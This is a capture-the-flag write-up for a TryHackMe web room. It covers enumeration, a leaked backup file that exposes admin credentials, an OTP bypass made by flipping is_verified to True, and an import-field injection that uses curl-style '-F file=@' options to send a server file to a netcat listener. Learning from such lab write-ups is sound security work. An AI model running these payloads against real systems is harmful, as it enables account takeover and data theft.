# TryHackMe - Interceptor

> **Category:** Web Security | Defensive Security
>
> **Difficulty:** Easy
>
> **Objective:** Enumerate the target web application, identify exposed development files, bypass authentication mechanisms, and retrieve both challenge flags.

---

# Scenario

In this challenge, we are presented with a web application named **MediaHub**. Our objective is to enumerate the exposed services, identify any development artifacts or security misconfigurations, bypass the implemented authentication mechanisms, and ultimately retrieve the flags hidden within the application.

Unlike a traditional exploitation challenge, this room focuses heavily on **web enumeration**, **source code disclosure**, **authentication bypass**, and **HTTP request manipulation using Burp Suite**.

---

# Investigation Methodology

The overall workflow followed during this challenge is shown below.

```text
Host Discovery
        │
        ▼
Port Enumeration
        │
        ▼
Service Enumeration
        │
        ▼
Web Enumeration
        │
        ▼
Directory & File Fuzzing
        │
        ▼
Source Code Disclosure
        │
        ▼
Credential Discovery
        │
        ▼
Authentication
        │
        ▼
OTP Bypass
        │
        ▼
Admin Access
        │
        ▼
File Import Abuse
        │
        ▼
Flag Retrieval
```

---

# Target Information

Main Target IP:

```text
10.48.138.97
```

---

# Initial Enumeration

The first step during every assessment is identifying exposed network services.

A full TCP port scan was performed.

```bash
nmap -p- 10.48.138.97
```

Open ports discovered:

```text
22/tcp

53/tcp

80/tcp
```

Since only three ports were exposed, the next step was service and version detection.

---

# Service Enumeration

Command executed:

```bash
nmap -sC -sV 10.48.138.97
```

The scan identified the following services.

| Port | Service | Version |
|--------|---------|----------|
| 22 | SSH | OpenSSH 8.2p1 |
| 53 | DNS | ISC BIND 9.16.1 |
| 80 | HTTP | Apache 2.4.41 |

Additional HTTP information:

```text
Title:
MediaHub

Server:
Apache/2.4.41 (Ubuntu)
```

Interesting observations:

- PHP session cookies were issued.
- The `HttpOnly` attribute was not enabled on the session cookie.
- Standard HTTP methods (GET, POST, OPTIONS, HEAD) were allowed.

Since the challenge clearly appeared web-focused, further investigation continued on **port 80**.

---

# Web Enumeration

Browsing the homepage revealed the **MediaHub** application.

At this stage no obvious vulnerabilities were immediately visible, so directory and file enumeration was performed.

---

# Directory & File Fuzzing

File and directory discovery was performed using **FFUF**.

Command used:

```bash
ffuf \
-u http://10.48.138.97/FUZZ \
-r \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
-e .php,.bk,.tar,.zip,.txt,.bak \
-fs 1491 \
-fw 95 \
-fc 403
```

The scan revealed several interesting locations.

```text
/assets

/uploads

/javascript

/phpmyadmin
```

Among these results, one file immediately stood out.

```text
login.php.bak
```

---

# Source Code Disclosure

Backup files are a common source of sensitive information because developers often leave copies of source code accessible on production servers.

Inspecting the discovered backup file revealed the following.

```php
<?php
include "header.php";

/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| MediaHub + any year
|
| TODO: remove before production deployment
*/
?>
```

---

# Analysis

This developer note discloses several critical pieces of information.

## Administrative Account

```text
admin@mediahub.thm
```

An administrator email address is exposed directly within the source code.

---

## Password Pattern

Even more importantly, the developers accidentally disclosed the password format.

```text
MediaHub + any year
```

Although the exact password is not revealed, the password policy significantly reduces the search space.

Instead of brute-forcing millions of combinations, only a small list of possible years needs to be tested.

This represents an example of **information disclosure through exposed backup files**.

---

# Password Wordlist Generation

Using the disclosed password policy, a custom password list was generated.

```bash
for y in $(seq 1990 2030)
do
    echo "MediaHub$y"
done > passwords.txt
```

Generated passwords included:

```text
MediaHub1990

MediaHub1991

...

MediaHub2025

MediaHub2026

...

MediaHub2030
```

---

# Authentication

Using the exposed administrator email together with the generated password list, the correct credentials were identified.

```
Username

admin@mediahub.thm
```

```
Password

MediaHub2026
```

---

# Analysis

Although the password followed a predictable format, the application implemented **rate limiting**, preventing traditional brute-force attacks using automated tools such as Hydra.

Instead of attempting a large-scale brute-force attack, the password was successfully derived through information disclosure combined with manual testing.

This demonstrates how leaked development notes can completely undermine otherwise strong authentication controls.

---

# OTP Verification

After successful authentication, the application required OTP verification before granting administrative access.

Instead of attempting to bypass the OTP cryptographically, the request was intercepted using **Burp Suite**.

The intercepted request contained the following parameter.

```http
is_verified=False
```

Modifying the parameter to:

```http
is_verified=True
```

allowed the request to bypass the verification process.

Modified request:

```http
------WebKitFormBoundary

Content-Disposition:
form-data;
name="is_verified"

True

------WebKitFormBoundary--
```

---

# Analysis

The application relied on a client-controlled parameter to determine whether the user had successfully completed OTP verification.

Because the server trusted this user-supplied value without independently validating the OTP, changing the value from:

```text
False
```

to

```text
True
```

was sufficient to bypass the verification entirely.

This represents a classic example of **broken server-side authentication validation**, where security decisions are delegated to data provided by the client.

Proper implementations should always verify authentication status on the server rather than relying on request parameters that can be modified by an attacker.

---

# Admin Access

After modifying the intercepted request, administrative access was successfully obtained.

The first challenge flag was revealed.

```text
THM{ADMIN_ACCESS_USING_BURP}
```

---

# Import Functionality

With administrator access obtained, additional functionality became available.

One feature accepted file imports.

Rather than importing a legitimate file, the functionality was abused to force the server to upload its own local file to an attacker-controlled listener.

The following payload was supplied.

```text
http://mediahub.com/ \
-F file=@/var/www/user.txt \
http://192.168.138.6:4444
```

---

# Capturing the File

A Netcat listener was started.

```bash
nc -lvnp 4444
```

Incoming connection:

```text
POST /

Content-Disposition:

file

filename="user.txt"
```

The uploaded file contained:

```text
THM{SYSTEM_PWNED_SUCCESSFULLY}
```

---

# Analysis

The import functionality allowed arbitrary file upload requests to be redirected toward an external host.

By specifying a local file using the `@` syntax, the application transmitted the server-side file to the attacker's listener.

This behaviour effectively resulted in **local file disclosure**, allowing sensitive files stored on the server to be exfiltrated without requiring direct shell access.

Although only the challenge flag was retrieved during this exercise, the same behaviour could expose configuration files, credentials, SSH keys, or other sensitive information if present.

---

# Flags

## User Flag

```text
THM{ADMIN_ACCESS_USING_BURP}
```

---

## Final Flag

```text
THM{SYSTEM_PWNED_SUCCESSFULLY}
```

---

# Attack Flow

```text
Nmap Scan
      │
      ▼
HTTP Enumeration
      │
      ▼
Directory Fuzzing
      │
      ▼
Backup File Disclosure
      │
      ▼
Developer Notes Found
      │
      ▼
Password Pattern Identified
      │
      ▼
Administrator Login
      │
      ▼
OTP Request Intercepted
      │
      ▼
is_verified=True
      │
      ▼
Admin Dashboard
      │
      ▼
Import Function Abuse
      │
      ▼
Server File Exfiltration
      │
      ▼
Final Flag Retrieved
```

---

# Key Findings

| Category | Observation |
|-----------|-------------|
| Web Server | Apache 2.4.41 |
| Backup File | `login.php.bak` |
| Information Disclosure | Developer Notes |
| Admin Account | `admin@mediahub.thm` |
| Password Pattern | `MediaHub + Year` |
| Valid Password | `MediaHub2026` |
| Authentication Weakness | Predictable Password Policy |
| OTP Weakness | Client-side Verification |
| Burp Manipulation | `is_verified=True` |
| File Disclosure | Import Function Abuse |
| Flag 1 | `THM{ADMIN_ACCESS_USING_BURP}` |
| Flag 2 | `THM{SYSTEM_PWNED_SUCCESSFULLY}` |

---

# Conclusion

This challenge demonstrates how multiple low-severity issues can combine to produce a complete compromise of a web application. The assessment began with standard enumeration, where directory fuzzing uncovered an exposed backup file containing sensitive developer notes. These notes disclosed both an administrative account and a predictable password policy, allowing valid credentials to be derived without brute force.

Although the application implemented OTP verification, the protection was ineffective because the server trusted a client-controlled parameter. By intercepting and modifying the request in Burp Suite, administrative access was obtained without completing the OTP process.

Finally, an insecure file import feature allowed local files from the server to be transmitted to an external listener, resulting in successful retrieval of the final flag.

This challenge highlights the importance of removing development artifacts before deployment, enforcing strong and unpredictable password policies, implementing server-side authentication checks, and validating file handling functionality to prevent information disclosure and abuse.
